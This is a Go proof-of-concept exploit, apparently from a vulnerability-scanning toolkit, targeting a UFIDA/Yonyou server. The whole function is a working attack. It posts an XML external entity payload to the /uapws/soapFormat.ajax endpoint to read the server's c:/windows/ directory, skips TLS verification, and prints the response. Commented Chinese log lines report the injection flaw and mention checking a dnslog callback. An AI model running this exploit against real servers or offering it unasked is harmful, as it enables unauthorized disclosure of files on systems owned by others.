package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

func UFIDA_UapwsXML(target string) {
	urlPath := strings.TrimRight(target, "/")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	payload := []byte("msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM \"file:///c:/windows/\"> ]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a")
	req, err := http.NewRequest("POST", urlPath+"/uapws/soapFormat.ajax", bytes.NewBuffer(payload))
	if err != nil {
		log.Println("[-] Failed to create request:", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
		return
	}
	fmt.Println(string(body))
	//reg := regexp.MustCompile("\"soapResponse\":..([^\\\"]+)")
	//msg := reg.MatchString(string(body))
	//if resp.StatusCode == http.StatusOK && msg {
	//	log.Println("[+] 存在SoapRequestXML注入漏洞，请检测dnslog回显")
	//} else {
	//	log.Println("[-] 不存在SoapRequestXML注入漏洞")
	//}
}
